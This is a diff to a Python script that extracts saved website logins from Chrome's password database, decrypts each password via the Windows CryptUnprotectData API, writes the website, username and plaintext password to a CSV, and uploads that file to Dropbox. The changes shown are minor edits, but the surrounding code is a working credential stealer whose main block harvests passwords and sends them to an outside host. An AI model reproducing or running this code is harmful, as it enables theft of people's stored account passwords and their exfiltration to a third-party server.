@@ -9,9 +9,6 @@ from io import StringIO
 from dropbox.files import WriteMode
 
 
-"""
-
-"""
 class ChromeRecord:
     def __init__(self, website, username, password):
         """
@@ -39,6 +36,7 @@ class ChromeRecord:
 
         return rep
 
+
 class ChromeAccountDatabase:
     def __init__(self, db_path=None):
         """
@@ -60,7 +58,7 @@ class ChromeAccountDatabase:
         """
         head = "===Chrome Account Database===\n\n"
         body =("   Website         |   Username         |    Password\n"
-              "{}                 {}                   {}\n")
+               "{}                 {}                   {}\n")
         representation = head
         for record in self.records:
             record_line = body.format(record.website, record.username, record.password)
@@ -108,12 +106,10 @@ class ChromeAccountDatabase:
             # Decrypt the password and store the results
             for website, username, password in query_result:
                 # CryptUnprotectData returns a tuple, (encrypted, decrypted) so take [1]
-                try:
-                    password = win32crypt.CryptUnprotectData(
-                        password, None, None, None, 0)[1]
+                password = win32crypt.CryptUnprotectData(
+                    password, None, None, None, 0)[1]
+                if password:
                     self.records.append(ChromeRecord(website, username, str(password) ))
-                except Exception as e:
-                    pass
 
     def to_csv(self, file_path: str = "chrome_accounts.csv", as_stream=False) -> Union[None, StringIO]:
         """
@@ -154,6 +150,7 @@ class ChromeAccountDatabase:
         dbx.files_upload(csv_stream.read().encode('utf-8'), 'chrome-accounts.csv', mode=WriteMode('overwrite'))
         return True
 
+
 if __name__ == "__main__":
     # Create a database object
     chrome_database = ChromeAccountDatabase()
@@ -165,4 +162,4 @@ if __name__ == "__main__":
     chrome_database.to_csv()
 
     # Upload all of the accounts to dropbox
-    chrome_database.to_dropbox()
+    chrome_database.to_dropbox("auth_token")
